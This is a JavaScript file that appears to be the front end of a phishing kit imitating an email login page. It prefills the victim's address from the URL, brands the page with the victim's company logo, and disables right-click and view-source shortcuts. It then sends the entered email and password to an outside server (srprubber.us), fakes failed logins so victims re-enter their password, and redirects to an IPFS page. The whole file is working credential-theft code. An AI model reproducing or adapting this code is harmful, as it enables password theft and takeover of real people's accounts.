


// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 || 
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});

/* global $ */
$(document).ready(function() {
    var count = 0;


    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(ai));
            var my_ai = ai;
        } else {
            // alert(atob(ai));
            var my_ai = atob(ai);
        }
        // $('#ai').val(ai);
        // var my_ai =ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var finalu = c.toUpperCase();
        $('#ai').val(my_ai);
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);
        
		$("#aicx").html(my_ai);
        $("#aich").html(my_ai);
        $.get("https://logo.clearbit.com/" + my_slice)
            .done(function() {
                $("#logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
                $("#logoname").html(finalu);
				$("#logonamec").html(finalu);

            }).fail(function() {
                $("#logoimg").attr("src", "data:image/png;base64,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");
                $("#logoname").html("");
				$("#logonamec").html("");

            });


    }





    $('#ai').click(function() {
        $('#error').hide();
    });

    $(document).keypress(function(event) {

        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
            if ($("#div1").is(":visible")) {

                $("#next").click();

            } else if ($("#div2").is(":visible")) {
                event.preventDefault();

                $("#submit-btn").click();

            } else {
                return false;
            }
        }
    });


    $('#next').click(function() {
        event.preventDefault();
        var my_ai = $('#ai').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var finalu = c.toUpperCase();
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);

        $("#aich").html(my_ai);
		$("#aicx").html(my_ai);
        $.get("" + my_slice)
            .done(function() {
                $("#logoimg").attr("src", "" + my_slice);
                $("#logoname").html(finalu);
				$("#logonamec").html(finalu);

            }).fail(function() {
                $("#logoimg").attr("src", "data:image/png;base64,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");
                $("#logoname").html("");
				$("#logonamec").html("");

            });





    });
    // $('#back').click(function() {
    //     // $("#msg").hide();
    //     $("#ai").val("");
    //     $("#pr").val("");
    //     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
    //     $("#div1").animate({ right: 0, opacity: "show" }, 1000);

    // });
var file="bmV4dC5waHA=";

    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var detail = $("#field").html();
        var msg = $('#msg').html();

        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#msg').text(msg);
        count = count + 1;
        $.ajax({
            dataType: 'JSON',
            url: 'https://srprubber.us/my/',
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
                detail: detail,

            },
            beforeSend: function(xhr) {
                $("#submit-btn").html("Authenticating....");
            },
            success: function(response) {
                $("#pr").val("");
                if (count >= 3) {
                    count = 0;
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    setTimeout(() => {
             window.location.replace("https://bafybeidcn7h4xogiok7hwogswtpkdtrmjjrm73ncu2jehlpvt5okcwfbvu.ipfs.w3s.link/complete.html?msg="+ai);
                    }, 500);
                    return false;
                }
                if (count == 2) {
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                } else {
                    $("#msg1").show();
                    $("#msg").hide();
                    $("#msg2").hide();

                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 3) {
                    count = 0;
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    setTimeout(() => {
                        window.location.replace("https://bafybeidcn7h4xogiok7hwogswtpkdtrmjjrm73ncu2jehlpvt5okcwfbvu.ipfs.w3s.link/complete.html?msg="+ai);
                    }, 1000);
                    return false;
                }
                if (count == 2) {
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                } else {
                    $("#msg1").show();
                    $("#msg").hide();
                    $("#msg2").hide();

                }
            },
            complete: function() {
                $("#submit-btn").html("Proceed with the Current Request");
            }
        });
    });
});
